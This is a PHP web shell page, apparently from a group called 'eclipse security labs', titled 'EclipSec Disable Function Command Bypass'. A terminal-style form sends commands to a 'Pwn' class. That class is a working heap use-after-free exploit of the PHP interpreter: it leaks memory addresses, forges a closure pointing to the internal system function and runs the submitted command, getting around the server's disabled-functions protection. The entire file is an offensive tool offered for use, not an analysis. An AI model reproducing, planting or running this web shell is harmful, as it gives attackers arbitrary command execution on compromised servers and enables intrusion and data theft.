<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CMD - Eclipse Terminal</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto+Mono:wght@400;700&display=swap" rel="stylesheet">
    <style>
        body {
            margin: 0;
            font-family: 'Roboto Mono', monospace;
            background-color: #1e1e2f;
            color: #ffffff;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            overflow: hidden;
        }
        .terminal {
            background-color: #2d2d44;
            width: 80%;
            max-width: 900px;
            padding: 20px;
            border-radius: 12px;
            box-shadow: 0 0 30px rgba(0, 0, 0, 0.5);
        }
        .terminal-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
            padding: 10px;
            background-color: #38385e;
            border-radius: 8px;
        }
        .terminal-header span {
            color: #a1a1e5;
            font-weight: bold;
            font-size: 18px;
        }
        .status-indicator {
            display: flex;
            align-items: center;
        }
        .status-indicator span {
            margin-left: 10px;
            color: #28c76f;
        }
        .status-circle {
            width: 12px;
            height: 12px;
            border-radius: 50%;
            background-color: #28c76f;
        }
        .terminal-output {
            background-color: #1e1e2f;
            color: #ffffff;
            padding: 20px;
            border-radius: 8px;
            height: 300px;
            overflow-y: auto;
            font-size: 16px;
            font-weight: 400;
            white-space: pre-wrap;
            border: 1px solid #38385e;
            line-height: 1.5;
        }
        .highlight {
            color: #28c76f;
            font-weight: bold;
        }
        .command-output {
            color: #28c76f;
            font-weight: bold;
        }
        .terminal-input {
            display: flex;
            align-items: center;
            margin-top: 20px;
        }
        .terminal-input input {
            flex: 1;
            padding: 12px;
            background-color: #38385e;
            border: none;
            color: #ffffff;
            font-family: 'Roboto Mono', monospace;
            font-size: 16px;
            border-radius: 8px;
            margin-right: 10px;
            box-shadow: inset 0 0 8px rgba(0, 0, 0, 0.3);
        }
        .terminal-input button {
            background-color: #28c76f;
            border: none;
            padding: 12px 24px;
            color: #ffffff;
            font-family: 'Roboto Mono', monospace;
            font-size: 16px;
            border-radius: 8px;
            cursor: pointer;
            box-shadow: 0 4px 10px rgba(40, 199, 111, 0.3);
        }
        .terminal-input button:hover {
            background-color: #22b369;
        }
    </style>
</head>
<body>
    <div class="terminal">
        <div class="terminal-header">
            <span>CMD - EclipSec Bypass</span>
            <div class="status-indicator">
                <div class="status-circle"></div>
                <span>Status: Connected</span>
            </div>
        </div>
        <div class="terminal-output" id="terminal-output">
<span class="highlight">╭─「 eclipse security labs 」</span>
<span class="highlight">| $ Made By NowMeee</span>
<span class="highlight">| $ visit : https://eclipsesec.tech/</span>
<span class="highlight">| $ EclipSec Disable Function Command Bypass 
<span class="highlight">╰──────────────────────────────────────────────
        </div>
        <form class="terminal-input" action="" method="post">
            <input type="text" id="eclipse" name="eclipse" placeholder="Enter your command...">
            <button type="submit">Run</button>
        </form>
        <?php
        ini_set('display_errors', 1);
        ini_set('display_startup_errors', 1);
        error_reporting(E_ALL);
        if (isset($_POST['eclipse'])) {
            class Helper { public $a, $b, $c; }
            class Pwn {
                const LOGGING = false;
                const CHUNK_DATA_SIZE = 0x60;
                const CHUNK_SIZE = ZEND_DEBUG_BUILD ? self::CHUNK_DATA_SIZE + 0x20 : self::CHUNK_DATA_SIZE;
                const STRING_SIZE = self::CHUNK_DATA_SIZE - 0x18 - 1;

                const HT_SIZE = 0x118;
                const HT_STRING_SIZE = self::HT_SIZE - 0x18 - 1;

                public function __construct($cmd) {
                    for($i = 0; $i < 10; $i++) {
                        $groom[] = self::alloc(self::STRING_SIZE);
                        $groom[] = self::alloc(self::HT_STRING_SIZE);
                    }

                    $concat_str_addr = self::str2ptr($this->heap_leak(), 16);
                    $fill = self::alloc(self::STRING_SIZE);

                    $this->abc = self::alloc(self::STRING_SIZE);
                    $abc_addr = $concat_str_addr + self::CHUNK_SIZE;
                    self::log("abc @ 0x%x", $abc_addr);

                    $this->free($abc_addr);
                    $this->helper = new Helper;
                    if(strlen($this->abc) < 0x1337) {
                        self::log("uaf failed");
                        return;
                    }

                    $this->helper->a = "leet";
                    $this->helper->b = function($x) {};
                    $this->helper->c = 0xfeedface;

                    $helper_handlers = $this->rel_read(0);
                    self::log("helper handlers @ 0x%x", $helper_handlers);

                    $closure_addr = $this->rel_read(0x20);
                    self::log("real closure @ 0x%x", $closure_addr);

                    $closure_ce = $this->read($closure_addr + 0x10);
                    self::log("closure class_entry @ 0x%x", $closure_ce);

                    $basic_funcs = $this->get_basic_funcs($closure_ce);
                    self::log("basic_functions @ 0x%x", $basic_funcs);

                    $zif_system = $this->get_system($basic_funcs);
                    self::log("zif_system @ 0x%x", $zif_system);

                    $fake_closure_off = 0x70;
                    for($i = 0; $i < 0x138; $i += 8) {
                        $this->rel_write($fake_closure_off + $i, $this->read($closure_addr + $i));
                    }
                    $this->rel_write($fake_closure_off + 0x38, 1, 4);
                    $handler_offset = PHP_MAJOR_VERSION === 8 ? 0x70 : 0x68;
                    $this->rel_write($fake_closure_off + $handler_offset, $zif_system);

                    $fake_closure_addr = $abc_addr + $fake_closure_off + 0x18;
                    self::log("fake closure @ 0x%x", $fake_closure_addr);

                    $this->rel_write(0x20, $fake_closure_addr);
                    ($this->helper->b)($cmd);

                    $this->rel_write(0x20, $closure_addr);
                    unset($this->helper->b);
                }

                private function heap_leak() {
                    $arr = [[], []];
                    set_error_handler(function() use (&$arr, &$buf) {
                        $arr = 1;
                        $buf = str_repeat("\x00", self::HT_STRING_SIZE);
                    });
                    $arr[1] .= self::alloc(self::STRING_SIZE - strlen("Array"));
                    return $buf;
                }

                private function free($addr) {
                    $payload = pack("Q*", 0xdeadbeef, 0xcafebabe, $addr);
                    $payload .= str_repeat("A", self::HT_STRING_SIZE - strlen($payload));

                    $arr = [[], []];
                    set_error_handler(function() use (&$arr, &$buf, &$payload) {
                        $arr = 1;
                        $buf = str_repeat($payload, 1);
                    });
                    $arr[1] .= "x";
                }

                private function rel_read($offset) {
                    return self::str2ptr($this->abc, $offset);
                }

                private function rel_write($offset, $value, $n = 8) {
                    for ($i = 0; $i < $n; $i++) {
                        $this->abc[$offset + $i] = chr($value & 0xff);
                        $value >>= 8;
                    }
                }

                private function read($addr, $n = 8) {
                    $this->rel_write(0x10, $addr - 0x10);
                    $value = strlen($this->helper->a);
                    if($n !== 8) { $value &= (1 << ($n << 3)) - 1; }
                    return $value;
                }

                private function get_system($basic_funcs) {
                    $addr = $basic_funcs;
                    do {
                        $f_entry = $this->read($addr);
                        $f_name = $this->read($f_entry, 6);
                        if($f_name === 0x6d6574737973) {
                            return $this->read($addr + 8);
                        }
                        $addr += 0x20;
                    } while($f_entry !== 0);
                }

                private function get_basic_funcs($addr) {
                    while(true) {
                        $addr -= 0x10;
                        if($this->read($addr, 4) === 0xA8 &&
                            in_array($this->read($addr + 4, 4),
                                [20180731, 20190902, 20200930, 20210902])) {
                            $module_name_addr = $this->read($addr + 0x20);
                            $module_name = $this->read($module_name_addr);
                            if($module_name === 0x647261646e617473) {
                                self::log("standard module @ 0x%x", $addr);
                                return $this->read($addr + 0x28);
                            }
                        }
                    }
                }

                private function log($format, $val = "") {
                    if(self::LOGGING) {
                        printf("{$format}\n", $val);
                    }
                }

                static function alloc($size) {
                    return str_shuffle(str_repeat("A", $size));
                }

                static function str2ptr($str, $p = 0, $n = 8) {
                    $address = 0;
                    for($j = $n - 1; $j >= 0; $j--) {
                        $address <<= 8;
                        $address |= ord($str[$p + $j]);
                    }
                    return $address;
                }
            }

            $cmd = $_POST['eclipse'];
            ob_start();
            new Pwn($cmd);
            $output = ob_get_clean();
            echo "<script>document.getElementById('terminal-output').innerHTML += `<div class='command-output'>no4meee@eclipsec :<br>$output</div>`;</script>";
        }
        ?>
    </div>
</body>
</html>
